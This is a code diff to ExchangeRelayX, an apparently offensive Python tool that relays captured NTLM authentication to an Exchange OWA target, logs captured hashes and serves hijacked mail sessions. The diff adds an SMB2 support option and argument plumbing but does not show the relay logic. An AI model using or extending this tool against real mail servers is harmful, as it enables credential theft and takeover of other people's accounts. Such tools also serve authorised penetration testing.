@@ -17,7 +17,7 @@ from lib import ExchangePlugin, OWAServer
 logger.init()
 logging.getLogger().setLevel(logging.INFO)
 
-VERSION = "1.0.0" 	# Alpha release, bugs will ensue
+VERSION = "1.0.1" 	# Alpha release, bugs will ensue
 
 def banner():
 	print '''ExchangeRelayX\nVersion: '''+str(VERSION)+'''\n'''
@@ -27,12 +27,13 @@ def parseCommandLine():
 	parser = argparse.ArgumentParser()
 	parser._optionals.title = "Standard arguments"
 	parser.add_argument('-t', metavar='targeturl', type=str, help='The target base url - typically the one hosting owa (eg. https://mail.vulncorp.com/)', required=True)
-	parser.add_argument('-c', action="store_true", default = None, help='Check if the target supports NTLM authentication, and then exit')
+	parser.add_argument('-c', action="store_true", default = False, help='Check if the target supports NTLM authentication, and then exit')
 	parser.add_argument('-o', '--outfile', metavar="HASHES.txt", default = None, help='Store captured hashes in the provided file')
 	parser.add_argument('-l', metavar="IP", default = "127.0.0.1", help='Host to serve the hacked OWA web sessions on (default: 127.0.0.1)')
 	parser.add_argument('-p', metavar="port", default = 8000, help='Port to serve the hacked OWA web sessions on (default: 8000)')
+	parser.add_argument('-smb2support', action="store_true", default=False, help='SMB2 Support')
 	args = parser.parse_args()
-	return args.t, args.outfile, args.l, args.p, args.c
+	return args.t, args.outfile, args.l, args.p, args.c, args.smb2support
 
 def checkNTLM(url):
 	logging.info("Testing " + url + " for NTLM authentication support...")
@@ -50,7 +51,7 @@ def checkNTLM(url):
 	except Exception, e:
 		logging.error("[checkNTLM] " + str(e))
 
-def startServers(targetURL, hashOutputFile = None, serverIP = "127.0.0.1", serverPort = 8000):
+def startServers(targetURL, hashOutputFile = None, serverIP = "127.0.0.1", serverPort = 8000, justCheck = False, smb2support = False):
 	PoppedDB		= Manager().dict()	# A dict of PoppedUsers
 	PoppedDB_Lock	= Lock()			# A lock for opening the dict
 
@@ -67,6 +68,7 @@ def startServers(targetURL, hashOutputFile = None, serverIP = "127.0.0.1", serve
 		c.setMode('RELAY')
 		c.setAttacks(C_Attack)
 		c.setInterfaceIp("0.0.0.0")
+		c.setSMB2Support(smb2support)
 		c.PoppedDB 		= PoppedDB 		# pass the poppedDB to the relay servers
 		c.PoppedDB_Lock = PoppedDB_Lock # pass the poppedDB to the relay servers
 		s = server(c)
@@ -89,7 +91,7 @@ def startServers(targetURL, hashOutputFile = None, serverIP = "127.0.0.1", serve
 
 if __name__ == "__main__":
 	banner()
-	targetURL, outputFile, serverIP, serverPort, justCheck = parseCommandLine()
+	targetURL, outputFile, serverIP, serverPort, justCheck, smb2support = parseCommandLine()
 
 	if targetURL[-1] == "/":
 		targetURL = targetURL + "EWS/Exchange.asmx"
@@ -101,12 +103,5 @@ if __name__ == "__main__":
 	if justCheck:
 		exit(0)
 
-	startServers(targetURL, outputFile, serverIP, serverPort)
+	startServers(targetURL, outputFile, serverIP, serverPort, justCheck, smb2support)
 	pass
-
-
-
-
-
-
-
